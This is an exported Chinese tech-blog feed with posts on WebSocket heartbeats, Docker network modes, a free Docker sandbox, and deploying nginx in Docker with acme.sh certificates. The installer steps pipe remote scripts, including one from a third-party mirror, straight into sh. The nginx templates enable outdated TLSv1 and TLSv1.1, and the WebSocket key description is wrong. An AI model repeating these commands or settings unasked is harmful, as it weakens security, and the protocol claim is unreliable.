<h2 id="心跳"><a href="#心跳" class="headerlink" title="心跳"></a>心跳</h2><p>心跳就是客户端定时的给服务端发送消息，证明客户端是在线的， 如果超过一定的时间没有发送则就是离线了。<br> 已知：nginx 代理的 websocket 转发，无消息连接会出现超时断开问题<br>两种解决办法</p>
<ol>
<li>修应nginx配置信息</li>
<li>websocket发送心跳包<br>主动触发有两种。<br>主动断开连接<br>ws.close();<br>主动发送消息<br>ws.send(“hello world”);</li>
</ol>
<h2 id="断线时如何解决"><a href="#断线时如何解决" class="headerlink" title="断线时如何解决"></a>断线时如何解决</h2><h3 id="心跳包机制："><a href="#心跳包机制：" class="headerlink" title="心跳包机制："></a>心跳包机制：</h3><p>它像心跳一样每隔固定时间发一次，以此来告诉服务器，这个客户端还活着。事实上这是为了保持长连接，至于这个包的内容，是没有什么特别规定的，不过一般都是很小的包，或者只包含包头的一个空包。<br><strong>下一个定时器，在一定时间间隔下发送一个空包给客户端，然后客户端反馈一个同样的空包回来，服务器如果在一定时间内收不到客户端发送过来的反馈包，那就只有认定掉线了。</strong></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>WebSocket 是为了在 web 应用上进行双通道通信而产生的协议，相比于轮询HTTP请求的方式，WebSocket 有节省服务器资源，效率高等优点。<br>WebSocket 中的掩码是为了防止早期版本中存在中间缓存污染攻击等问题而设置的，客户端向服务端发送数据需要掩码，服务端向客户端发送数据不需要掩码。<br>WebSocket 中 Sec-WebSocket-Key 的生成算法是拼接服务端和客户端生成的字符串，进行SHA1哈希算法，再用base64编码。<br>WebSocket 协议握手是依靠 HTTP 协议的，依靠于 HTTP 响应101进行协议升级转换。</p>
]]></content>
      <tags>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>axios Promise 响应封装</title>
    <url>/posts/31409493/</url>
    <content><![CDATA[<h1 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h1><p>axios也是返回一个promise对象，他会封装两个结果，成功即为response，需要取出从服务器获得的响应数据，response.data。失败为error，需要获取为error.message。</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>coil的使用</title>
    <url>/posts/db99acce/</url>
    <content><![CDATA[<p><a href="https://juejin.cn/post/7098174443700092935">https://juejin.cn/post/7098174443700092935</a></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>docker服务器白嫖</title>
    <url>/posts/9c04f269/</url>
    <content><![CDATA[<blockquote>
<p>这篇文章的主要面向人群：临时使用linux服务器来测试一些程序，项目等。</p>
</blockquote>
<p><a href="https://labs.play-with-docker.com/">play with docker</a><br>进入这个链接，然后登陆后，就会看到如下界面<br><img src="https://image.zfxt.top/hexo-blog/docker%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%99%BD%E5%AB%96-2024-12-25-11-51-42.png" alt="docker服务器白嫖-2024-12-25-11-51-42"><br>他会给你提供4个小时的免费使用时长，而且你可以创建多个实例。每个实例都是4h4g的docker服务器。而且这些示例你可以通过ssh远程连接，也可以直接开放端口直接开放在外网。(<em><strong>可是说是配置拉满的免费服务了</strong></em>)</p>
<p>创建完成后，会有一些问题需要解决，第一，他的服务器系统并不和我们常用的ubuntu，centos类似。于是要在这个服务器上跑项目，肯定会有很多环境配置不方便。所以我们使用docker来跑一个ubuntu供我们使用<br>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd --privileged --init -v /:/mnt --network host ubuntu --name ubuntu</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以避免僵尸进程和孤儿进程--privileged --init</span></span><br><span class="line">docker exec -it ubuntu bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后使用`<span class="built_in">exec</span>`进入docker并打开一个bash终端</span></span><br></pre></td></tr></table></figure>

<p><img src="https://image.zfxt.top/hexo-blog/docker%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%99%BD%E5%AB%96-2024-12-25-12-08-22.png" alt="docker服务器白嫖-2024-12-25-12-08-22"><br>如此，你就可以快乐的使用ubuntu跑一些小服务玩玩了。</p>
<p>原视频在这里，大家可以去看一看：</p>
<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
    <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113028372628998&bvid=BV14rsjejEX6&cid=500001663106969&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe>
</div>

]]></content>
      <categories>
        <category>白嫖</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker网络模式</title>
    <url>/posts/f491796a/</url>
    <content><![CDATA[<blockquote>
<p>该文章引用自<a href="https://blog.csdn.net/succing/article/details/122433770">csdn血煞长虹的文章</a>，本文仅做概括性整理，辅助自己理解</p>
</blockquote>
<p>首先，容器之间虽然不是物理隔离，但是它们彼此之间默认是<span style="color:blue">不互联互通</span>的，这也有助于保持每个容器的纯粹性，相互之间互不影响。<br>其次，既然使用了容器，通常情况下，容器需要与宿主机通信，或者A容器与B容器通信而B不需要知道A的存在，或者A&#x2F;B两容器相互通信。</p>
<table>
<thead>
<tr>
<th>模式名称</th>
<th>简介</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>bridge</td>
<td>容器拥有独属于自己的虚拟网卡和和虚拟IP等网络资源，它们分别通过docker0虚拟网卡与宿主机的eth0网卡交互，进而和外界网络交互</td>
<td>默认模式</td>
</tr>
<tr>
<td>host</td>
<td>容器没有自己的任何独立的网络资源(比如：容器的IP、网卡和端口)，完全和宿主机共享网络空间</td>
<td>弊端：同一个端口只能同时被一个容器服务绑定</td>
</tr>
<tr>
<td>none</td>
<td>光秃秃的一个容器，没有任何的网络资源，就是自娱自乐的光杆司令（很少用）</td>
<td>该模式关闭了容器的网络功能，仅有独自的网络空间（一个空架子），并且该模式不会给容器分配任何网络资源，包括虚拟网卡、路由、防火墙、IP、网关、端口等</td>
</tr>
<tr>
<td>container</td>
<td>它是bridge和host模式的合体，优先以bridge方式启动启动第一个容器，后面的所有容器启动时，均指定网络模式为container，它们均共享第一个容器的网络资源，除了网络资源，其他资源，容器彼此之间依然是相互隔离的</td>
<td>第一个以bridge方式启动的容器服务挂掉，后面依赖它的容器，都暂停服务</td>
</tr>
<tr>
<td>自定义</td>
<td>该模式也更为灵活，可以通过-d 指定自定义的网络模式的类型，可以是bridge或者overlay，其中overlay功能更为强大，可以指定多个subnet子网网段。</td>
<td>该模式，在容器之间可以使用别名相互通信，这一点很nice（重要）</td>
</tr>
</tbody></table>
<blockquote>
<p>docker0虚拟网卡科普：<br>当docker进程启动时，会在主机上创建一个名为docker0的虚拟网桥，宿主机上以Bridge模式启动的容器会链接到这个虚拟网桥上。docker0默认地址172.17.0.0&#x2F;16。虚拟网桥的工作方式和物理交换机类似，这样宿主机上的所有容器就通过docker0连在一个二层网络中，再通过docker0和物理网卡eth0交互（我本机的物理网卡名字是ens33）</p>
</blockquote>
<h2 id="bridge桥接网络模式"><a href="#bridge桥接网络模式" class="headerlink" title="bridge桥接网络模式"></a>bridge桥接网络模式</h2><p>就是指，通过bridge桥接的方式，将容器连接到宿主机的docker0虚拟网桥上，每个容器都有自己的虚拟网卡和虚拟IP等网络资源，他们就像是连接在一个交换机上的设备一样，可以相互通信。<br><img src="https://image.zfxt.top/hexo-blog/docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F-2024-07-02-11-01-31.png" alt="docker网络模式-2024-07-02-11-01-31"></p>
<h2 id="host主机网络模式"><a href="#host主机网络模式" class="headerlink" title="host主机网络模式"></a>host主机网络模式</h2><p>容器直接使用宿主机的网络资源，不会分配自己的IP地址，端口等，完全和宿主机共享网络空间，这样容器就可以直接使用宿主机的网络资源，比如宿主机的IP地址，端口等。（缺点是：同一个端口只能同时被一个容器服务绑定）</p>
<p><img src="https://image.zfxt.top/hexo-blog/docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F-2024-07-02-11-47-46.png" alt="docker网络模式-2024-07-02-11-47-46"></p>
<h2 id="container容器网络模式"><a href="#container容器网络模式" class="headerlink" title="container容器网络模式"></a>container容器网络模式</h2><p>该模式≈bridge+host的混合模式，指定一个容器以bridge方式启动，后面容器启动时指定网络模式为container，它们自动共享第一个容器的网络资源。<br>就是将第一个容器以bridge模式启动，然后其他的容器以container模式启动，这样他们就共享第一个容器的网络资源，但是其他资源还是独立的。<br><img src="https://image.zfxt.top/hexo-blog/docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F-2024-07-02-11-48-31.png" alt="docker网络模式-2024-07-02-11-48-31"></p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>context.getContentResolver().query()详细用法详解</title>
    <url>/posts/cddd434c/</url>
    <content><![CDATA[<p>这里不再多写，直接引用就好了，写的挺详尽的</p>
<blockquote>
<p>引用自<a href="https://blog.csdn.net/qqq3670279/article/details/51475899?ops_request_misc=&request_id=&biz_id=102&utm_term=Cursor%20cursor%20=%20context.getCon&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-51475899.pc_search_result_hbase_insert&spm=1018.2226.3001.4187">csdn qqq3670279
</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>docker,nginx,ssl最佳实践</title>
    <url>/posts/16639286/</url>
    <content><![CDATA[<blockquote>
<p>基于我对docker，nginx还有ssl证书的部署，提出了我对这些服务最高效的部署方法。仅供参考，一定会有更好的方法，只是我还有待学习</p>
</blockquote>
<h1 id="使用docker部署nginx"><a href="#使用docker部署nginx" class="headerlink" title="使用docker部署nginx"></a>使用docker部署nginx</h1><p>docker部署nginx有什么好处呢？大概就是可以把所有相关的配置文件汇集在一块，也方便在不同的服务器中迁移。<br>这里提供部署所使用的docker代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先创建一个nginx网络</span></span><br><span class="line">docker network create nginx_container</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行nginx并添加到该网络中</span></span><br><span class="line">docker run --name=nginx  \</span><br><span class="line">--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/logs:/var/log/nginx \</span><br><span class="line">--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/html:/etc/nginx/html \</span><br><span class="line">--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/ssl:/etc/nginx/ssl \</span><br><span class="line">--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">--volume=/home/&#123;user&#125;/&#123;your_path&#125;/nginx/conf.d:/etc/nginx/conf.d \</span><br><span class="line">--network=nginx_container -p 443:443 -p 80:80 --restart=always --runtime=runc --detach=true nginx nginx -g &#x27;daemon off;&#x27;</span><br></pre></td></tr></table></figure>

<p>在上述命令中，最关键的内容有4点：</p>
<h2 id="本地目录映射"><a href="#本地目录映射" class="headerlink" title="本地目录映射"></a>本地目录映射</h2><p>我一共映射了4个目录和一个配置文件(这些目录和配置文件需要你提前创建好，方便docker对其映射)</p>
<ul>
<li><p>logs<br>  该目录下主要保存着每次访问网站时保存的日志记录，可以用来查询相关的访问记录和debug<br>  <img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-15-02-58.png" alt="docker-nginx-ssl最佳实践-2024-12-25-15-02-58"></p>
</li>
<li><p>html<br>  这里就是你所使用的静态文件了。同样映射到了docker下的<code>/etc/nginx/html</code>这个部分的内容即默认的root根目录。可以很方便的对不同的项目进行反向代理，而且只用填相对路径</p>
</li>
<li><p>ssl<br>  此处放你需要配置的ssl证书，后续我会说如何配置<code>freessl</code>实现永久的证书自动配置功能</p>
</li>
<li><p>conf.d<br>  这个目录存放你对不同项目的不同配置文件，做到每个项目都分开存放，结构清晰。</p>
</li>
<li><p>nginx.conf<br>  这里是使用默认的配置文件，我会提供模板：</p>
  <figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">user</span> www-data;</span><br><span class="line"><span class="attribute">worker_processes</span> auto;</span><br><span class="line"><span class="attribute">pid</span> /run/nginx.pid;</span><br><span class="line"><span class="attribute">include</span> /etc/nginx/modules-enabled/<span class="regexp">*.conf</span>;</span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">        <span class="attribute">worker_connections</span> <span class="number">768</span>;</span><br><span class="line">        <span class="comment"># multi_accept on;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># Basic Settings</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="attribute">sendfile</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">tcp_nopush</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">tcp_nodelay</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">keepalive_timeout</span> <span class="number">65</span>;</span><br><span class="line">        <span class="attribute">types_hash_max_size</span> <span class="number">2048</span>;</span><br><span class="line">        <span class="comment"># server_tokens off;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># server_names_hash_bucket_size 64;</span></span><br><span class="line">        <span class="comment"># server_name_in_redirect off;</span></span><br><span class="line">        <span class="attribute">include</span> /etc/nginx/mime.types;</span><br><span class="line">        <span class="attribute">default_type</span> application/octet-stream;</span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># SSL Settings</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>; <span class="comment"># Dropping SSLv3, ref: POODLE</span></span><br><span class="line">        <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># Logging Settings</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">access_log</span> /var/log/nginx/access.log;</span><br><span class="line">        <span class="attribute">error_log</span> /var/log/nginx/<span class="literal">error</span>.log;</span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># Gzip Settings</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># gzip_vary on;</span></span><br><span class="line">        <span class="comment"># gzip_proxied any;</span></span><br><span class="line">        <span class="comment"># gzip_comp_level 6;</span></span><br><span class="line">        <span class="comment"># gzip_buffers 16 8k;</span></span><br><span class="line">        <span class="comment"># gzip_http_version 1.1;</span></span><br><span class="line">        <span class="comment"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># Virtual Host Configs</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># 这里将会引用你在conf.d下的所有配置文件。所以这个nginx.conf文件你都不用编辑</span></span><br><span class="line">        <span class="attribute">include</span> /etc/nginx/conf.d/<span class="regexp">*.conf</span>;</span><br><span class="line">        <span class="attribute">include</span> /etc/nginx/sites-enabled/*;</span><br><span class="line">        <span class="attribute">include</span> /etc/nginx/conf.d/**/<span class="regexp">*.conf</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#test_3d</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#mail &#123;</span></span><br><span class="line"><span class="comment">#       # See sample authentication script at:</span></span><br><span class="line"><span class="comment">#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       # auth_http localhost/auth.php;</span></span><br><span class="line"><span class="comment">#       # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span></span><br><span class="line"><span class="comment">#       # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       server &#123;</span></span><br><span class="line"><span class="comment">#               listen     localhost:110;</span></span><br><span class="line"><span class="comment">#               protocol   pop3;</span></span><br><span class="line"><span class="comment">#               proxy      on;</span></span><br><span class="line"><span class="comment">#       &#125;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       server &#123;</span></span><br><span class="line"><span class="comment">#               listen     localhost:143;</span></span><br><span class="line"><span class="comment">#               protocol   imap;</span></span><br><span class="line"><span class="comment">#               proxy      on;</span></span><br><span class="line"><span class="comment">#       &#125;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="配置专门的nginx网络"><a href="#配置专门的nginx网络" class="headerlink" title="配置专门的nginx网络"></a>配置专门的nginx网络</h2><p>可以看到我在上面的docker命令中，有一个<code>--network=nginx_container</code>的选项。</p>
<p>使用<code>docker network inspect nginx_container</code>命令查看<br><img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-15-11-21.png" alt="docker-nginx-ssl最佳实践-2024-12-25-15-11-21"><br>如何将其他容器添加到某个网络中？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一，在启动容器时就使用--network的选项就添加到某个网络中去</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二，使用下面这条命令</span></span><br><span class="line">docker network connect &#123;network_name&#125; &#123;container_name&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如 docker network connect nginx_container alist</span></span><br></pre></td></tr></table></figure>

<p>使用图示来展示关于这一操作的妙用：<br><img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-15-28-17.png" alt="docker-nginx-ssl最佳实践-2024-12-25-15-28-17"><br>这样子，其他的服务不占用主机的外部端口，而只依靠nginx代理出去。保证了服务的安全，也减少了端口被扫，被攻击的风险。</p>
<p>同时，在配置文件中，也会有很方便的地方。这里展示<code>alist.conf</code><br><img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-15-34-27.png" alt="docker-nginx-ssl最佳实践-2024-12-25-15-34-27">我们不在需要写完整的服务器ip地址，而是通过<code>http://alist</code>的方式自动去访问，即便服务器被重启，他分配在不同的ip。也可以实现对应的访问功能。</p>
<p>还有更多关于nginx网络的部分可以查看这一文章<a href="https://zfxt.top/posts/f491796a/">docker网络模式</a></p>
<h2 id="设置一直重启"><a href="#设置一直重启" class="headerlink" title="设置一直重启"></a>设置一直重启</h2><p>这里就是简单的参数配置<br><code>--restart=always</code><br>即使服务器因为断电等原因重启，也可以在通电后重新恢复服务。</p>
<h1 id="为nginx配置ssl证书"><a href="#为nginx配置ssl证书" class="headerlink" title="为nginx配置ssl证书"></a>为nginx配置ssl证书</h1><p>配置ssl证书其实是比较简单的事。<br>你可以从阿里云，腾讯云免费领取到时长1年的单域名证书，然后在conf配置中开启ssl校验并配置ssl证书和密钥的地址即可。</p>
<p>我这里主要是为了实现泛域名的永久性配置。<br><a href="https://freessl.cn/automation/auth">freessl</a>这是我最常用的ssl证书配置服务。他提供3个月时长的免费泛域名。然后通过一些配置实现到期自动更新部署新的证书，做到永久有效。</p>
<blockquote>
<p>他有新版和旧版之区分，我这里演示旧版的功能。新版就是替你实现dns服务器的配置过程。都是很好的服务。(只是我懒得搞了。就用旧版演示看看就好啦)</p>
</blockquote>
<h2 id="添加域名"><a href="#添加域名" class="headerlink" title="添加域名"></a>添加域名</h2><p><img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-16-02-00.png" alt="docker-nginx-ssl最佳实践-2024-12-25-16-02-00"><br>添加域名可以使用泛域名和单域名。添加域名后，需要你证明这个域名是在你的名下，而且你对他有控制权。即在对应的dns服务商添加上他要求你添加的配置项</p>
<blockquote>
<p>新版就是这里不需要你进行验证，而是把验证过程交给系统去实现，你只需要提供几个token。</p>
</blockquote>
<p><img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-16-03-20.png" alt="docker-nginx-ssl最佳实践-2024-12-25-16-03-20"></p>
<p>通过添加CNAME验证，过一小段时间后，他就会校验成功。<br><img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-16-11-54.png" alt="docker-nginx-ssl最佳实践-2024-12-25-16-11-54"><br><img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-16-13-16.png" alt="docker-nginx-ssl最佳实践-2024-12-25-16-13-16"></p>
<h2 id="将证书部署到服务器"><a href="#将证书部署到服务器" class="headerlink" title="将证书部署到服务器"></a>将证书部署到服务器</h2><p>接下里使用<code>acme.sh</code>将证书部署到服务器。</p>
<ol>
<li><p>安装<code>acme.sh</code>客户端<br> 官方下载地址：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://get.acme.sh | sh -s email=my@example.com</span><br></pre></td></tr></table></figure>

<p> 备用下载地址</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://gitcode.net/cert/cn-acme.sh/-/raw/master/install.sh?inline=false | sh -s email=my@example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取申请命令<br> 在<code>ACME客户端</code>-&gt;<code>申请证书</code>中，获取安装命令<br> <img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-16-18-52.png" alt="docker-nginx-ssl最佳实践-2024-12-25-16-18-52"><br> 然后将你获取到的命令直接在服务器中运行即可，等待片刻后，证书和密钥就会保存在你用户目录下的<code>.acme.sh/&#123;域名&#125;</code>下<br> <img src="https://image.zfxt.top/hexo-blog/docker-nginx-ssl%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2024-12-25-16-23-07.png" alt="docker-nginx-ssl最佳实践-2024-12-25-16-23-07"><br> 其中你需要使用的到的是<code>fullchain.cer</code>和<code>selflove.ren.key</code></p>
</li>
<li><p>将证书安装到具体的目录下<br> 命令如下：(以我的目录结构为示例)</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">acme.sh --install-cert -d selflove.ren \</span><br><span class="line">        --key-file       /home/zfxt/docker_data/nginx/ssl/selflove.key  \</span><br><span class="line">        --fullchain-file /home/zfxt/docker_data/nginx/ssl/selflove.cer</span><br></pre></td></tr></table></figure>

<p> 完成安装后，他会每天检测定时检测，若是域名还只剩下一个月时，他就会重新进行一次证书获取和安装<br> 可以使用<code>crontab -l</code>查看系统的定时任务。会有一个和acme.sh相关的任务的</p>
</li>
</ol>
<h2 id="为nginx使用配置文件"><a href="#为nginx使用配置文件" class="headerlink" title="为nginx使用配置文件"></a>为nginx使用配置文件</h2><p>直接使用模板文件到时候再修改即可：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">        <span class="attribute">server_name</span> alist.zfxt.top;</span><br><span class="line">        <span class="comment"># 下面ssl开头的是HTTPS相关的设置</span></span><br><span class="line">        <span class="attribute">ssl_certificate</span>          /etc/nginx/ssl/fullchain.cer;</span><br><span class="line">        <span class="attribute">ssl_certificate_key</span>     /etc/nginx/ssl/all.key;</span><br><span class="line">        <span class="attribute">ssl_session_timeout</span>     <span class="number">3600m</span>;<span class="comment">#session有效期，根据需要适当延长</span></span><br><span class="line">        <span class="attribute">ssl_session_cache</span>       shared:SSL:<span class="number">10m</span>;</span><br><span class="line">        <span class="comment"># 使用的加解密方式</span></span><br><span class="line">        <span class="attribute">ssl_ciphers</span>             ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">        <span class="comment"># 支持的协议类型</span></span><br><span class="line">        <span class="attribute">ssl_protocols</span>             TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">        <span class="comment"># 优先使用服务端的加解密方式</span></span><br><span class="line">        <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">          <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">          <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">          <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line">          <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">          <span class="attribute">proxy_set_header</span> Range <span class="variable">$http_range</span>;</span><br><span class="line">          <span class="attribute">proxy_set_header</span> If-Range <span class="variable">$http_if_range</span>;</span><br><span class="line">          <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">          <span class="attribute">proxy_pass</span> http://alist:5244;</span><br><span class="line">          <span class="comment"># the max size of file to upload</span></span><br><span class="line">          <span class="attribute">client_max_body_size</span> <span class="number">20000m</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在docker中的<code>etc/nginx/ssl</code>目录就映射我们在对应位置的ssl目录。因此只需要做到上述配置。就差不多配置好了ssl证书了。</p>
<blockquote>
<p>以上，本次文章的目的基本就达成了。下面在补充一些关于nginx的使用说明。</p>
</blockquote>
<h1 id="nginx使用说明"><a href="#nginx使用说明" class="headerlink" title="nginx使用说明"></a>nginx使用说明</h1><h2 id="Nginx的location语法"><a href="#Nginx的location语法" class="headerlink" title="Nginx的location语法"></a>Nginx的location语法</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> [=|~|~*|^~] /uri/ &#123; … &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x3D;         严格匹配。如果请求匹配这个location，那么将停止搜索并立即处理此请求</li>
<li>~         区分大小写匹配(可用正则表达式)</li>
<li>~*       不区分大小写匹配(可用正则表达式)</li>
<li>!~       区分大小写不匹配</li>
<li>!~*     不区分大小写不匹配</li>
<li>^~      如果把这个前缀用于一个常规字符串,那么告诉nginx 如果路径匹配那么不测试正则表达式</li>
</ul>
<h2 id="alias与root的区别"><a href="#alias与root的区别" class="headerlink" title="alias与root的区别"></a>alias与root的区别</h2><ul>
<li>root    实际访问文件路径会拼接URL中的路径</li>
<li>alias   实际访问文件路径不会拼接URL中的路径</li>
</ul>
<p>示例如下：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span><span class="regexp"> ^~</span> /sta/ &#123;  </span><br><span class="line">   <span class="attribute">alias</span> /usr/local/nginx/html/static/;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求：<code>http://test.com/sta/sta1.html</code><br>实际访问：<code>/etc/nginx/html/static/sta1.html</code> 文件</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span><span class="regexp"> ^~</span> /tea/ &#123;  </span><br><span class="line">   <span class="attribute">root</span> /usr/local/nginx/html/;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求：<code>http://test.com/tea/tea1.html</code><br>实际访问：<code>/etc/nginx/html/tea/tea1.html</code> 文件</p>
<h2 id="proxy-pass的使用"><a href="#proxy-pass的使用" class="headerlink" title="proxy_pass的使用"></a>proxy_pass的使用</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> /api &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span>  http://api_server;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>  X-Real-IP        <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>  X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>  your-custome-header    <span class="string">&quot;myHeader&quot;</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-NginX-Proxy <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置反向代理时，移除前缀。比如我们的服务<code>http://test.com/api/random</code>, 我们想要代理到<code>http://yiyan.com/random</code>，即切换域名的同时，去掉api前缀。区别是<code>proxy_pass</code>结尾的<code>/</code>.<br>无<code>/</code>则保留前缀，有<code>/</code>则删除前缀。</p>
